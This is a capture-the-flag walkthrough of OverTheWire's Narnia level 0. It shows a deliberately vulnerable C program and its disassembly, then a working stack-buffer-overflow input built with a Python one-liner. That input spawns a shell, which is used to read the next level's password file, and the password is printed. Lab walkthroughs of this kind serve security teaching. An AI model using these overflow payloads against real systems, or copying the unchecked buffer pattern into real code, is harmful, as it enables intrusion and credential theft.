Game Site: narnia.labs.overthewire.org  

# Level 0

User: narnia0  
Pass: narnia0  

## Disassembly ##

    080484c4 <main>:
     80484c4:       55                      push   %ebp
     80484c5:       89 e5                   mov    %esp,%ebp
     80484c7:       83 e4 f0                and    $0xfffffff0,%esp
     80484ca:       83 ec 30                sub    $0x30,%esp
     80484cd:       c7 44 24 2c 41 41 41    movl   $0x41414141,0x2c(%esp)
     80484d4:       41 
     80484d5:       c7 04 24 40 86 04 08    movl   $0x8048640,(%esp)
     80484dc:       e8 cf fe ff ff          call   80483b0 <puts@plt>
     80484e1:       b8 73 86 04 08          mov    $0x8048673,%eax
     80484e6:       89 04 24                mov    %eax,(%esp)
     80484e9:       e8 b2 fe ff ff          call   80483a0 <printf@plt>
     80484ee:       b8 89 86 04 08          mov    $0x8048689,%eax
     80484f3:       8d 54 24 18             lea    0x18(%esp),%edx
     80484f7:       89 54 24 04             mov    %edx,0x4(%esp)
     80484fb:       89 04 24                mov    %eax,(%esp)
     80484fe:       e8 fd fe ff ff          call   8048400 <__isoc99_scanf@plt>
     8048503:       b8 8e 86 04 08          mov    $0x804868e,%eax
     8048508:       8d 54 24 18             lea    0x18(%esp),%edx
     804850c:       89 54 24 04             mov    %edx,0x4(%esp)
     8048510:       89 04 24                mov    %eax,(%esp)
     8048513:       e8 88 fe ff ff          call   80483a0 <printf@plt>
     8048518:       b8 97 86 04 08          mov    $0x8048697,%eax
     804851d:       8b 54 24 2c             mov    0x2c(%esp),%edx
     8048521:       89 54 24 04             mov    %edx,0x4(%esp)
     8048525:       89 04 24                mov    %eax,(%esp)
     8048528:       e8 73 fe ff ff          call   80483a0 <printf@plt>
     804852d:       81 7c 24 2c ef be ad    cmpl   $0xdeadbeef,0x2c(%esp)
     8048534:       de 
     8048535:       75 13                   jne    804854a <main+0x86>
     8048537:       c7 04 24 a4 86 04 08    movl   $0x80486a4,(%esp)
     804853e:       e8 7d fe ff ff          call   80483c0 <system@plt>
     8048543:       b8 00 00 00 00          mov    $0x0,%eax
     8048548:       c9                      leave  
     8048549:       c3                      ret    
     804854a:       c7 04 24 ac 86 04 08    movl   $0x80486ac,(%esp)
     8048551:       e8 5a fe ff ff          call   80483b0 <puts@plt>
     8048556:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
     804855d:       e8 7e fe ff ff          call   80483e0 <exit@plt>

## Source Code ##

    /*
        This program is free software; you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation; either version 2 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program; if not, write to the Free Software
        Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
    */
    #include <stdio.h>
    #include <stdlib.h>

    int main(){
      long val=0x41414141;
      char buf[20];

      printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
      printf("Here is your chance: ");
      scanf("%24s",&buf);

      printf("buf: %s\n",buf);
      printf("val: 0x%08x\n",val);

      if(val==0xdeadbeef)
        system("/bin/sh");
      else {
        printf("WAY OFF!!!!\n");
        exit(1);
      }

      return 0;
    }

## Notes ##

Upon first seeing this level I started with disassembling the code to try and identify what type of vulnerability 
we're dealing with (yes, I know the source code was given too).  At offset `0x080484cd` we see that our target 
value of `0x41414141` is saved on the stack at offset `0x2c`.  Then at `0x080484f3` we see the address of our 
buffer (stored on the stack at offset `0x18`) is loaded into `%edx` which is then passed to a `scaf()` call.  A 
quick bit of math, `0x2c - 0x18`, tells us that the buffer used to store our input is 20 bytes and we also know 
that our target is stored just above our buffer.  Intuition tells us that this is a stack buffer overflow.

Running the program with the a test string of 20 A's followed by 4 B's shows that we can in fact overwrite 
the target variable.

    narnia0@melinda:/narnia$ ./narnia0  
    Correct val's value from 0x41414141 -> 0xdeadbeef!
    Here is your chance: AAAAAAAAAAAAAAAAAAAABBBB
    buf: AAAAAAAAAAAAAAAAAAAABBBB
    val: 0x42424242
    WAY OFF!!!!
    narnia0@melinda:/narnia$

Now we just need to get the desired value of `0xdeadbeef` in there.  I don't know why, but initially I thought it 
would be just a matter of escaping the bytes as I typed them in, like so:

    narnia0@melinda:/narnia$ ./narnia0
    Correct val's value from 0x41414141 -> 0xdeadbeef!
    Here is your chance: AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde
    buf: AAAAAAAAAAAAAAAAAAAA\xef
    val: 0x6665785c
    WAY OFF!!!!
    narnia0@melinda:/narnia$

As you can see, this is clearly not the case.  This does not work because the `%s` format string used in `scanf()` 
interprets each character typed as a single byte, there is no interpretation of the string done.  Once I realized 
this it was a matter of constructing our string outside of the program and passing it in.  We can do this with 
Python like so:

    narnia0@melinda:/narnia$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0 
    Correct val's value from 0x41414141 -> 0xdeadbeef!
    Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
    val: 0xdeadbeef
    narnia0@melinda:/narnia$

Fantastic! We set the value, but where's our promised shell? Running our code again with `ltrace` we see that 
the shell is closed immediately.

    narnia0@melinda:/narnia$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ltrace ./narnia0 
    __libc_start_main(0x80484c4, 1, -10268, 0x8048570, 0x80485e0 <unfinished ...>
    puts("Correct val's value from 0x41414"...Correct val's value from 0x41414141 -> 0xdeadbeef!
    )                                                                                         = 51
    printf("Here is your chance: ")                                                                                                     = 21
    __isoc99_scanf(0x8048689, -10456, 0x8049ff4, 0x8048591, -1)                                                                         = 1
    printf("buf: %s\n", "AAAAAAAAAAAAAAAAAAAA\357\276\255\336"Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
    )                                                                         = 30
    printf("val: 0x%08x\n", 0xdeadbeefval: 0xdeadbeef
    )                                                                                                 = 16
    system("/bin/sh" <unfinished ...>
    --- SIGCHLD (Child exited) ---
    <... system resumed> )                                                                                                              = 0
    +++ exited (status 0) +++
    narnia0@melinda:/narnia$

In order to keep our shell open we need to also pass in something that will force the shell to wait for us.  After 
a bit of playing around it seems that `cat` is our way in.

    narnia0@melinda:/narnia$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; cat) | ./narnia0
    Correct val's value from 0x41414141 -> 0xdeadbeef!
    Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
    val: 0xdeadbeef
    whoami
    narnia1
    cat /etc/narnia_pass/narnia1
    efeidiedae
    ^C
    narnia0@melinda:/narnia$

And now we have the password to the next level.

## Concepts From This Level ##

- Stack buffer overflow
- Pass input generated from Python
- Use of `cat` to force the shell to wait

# Level 1

User: narnia1  
Pass: efeidiedae  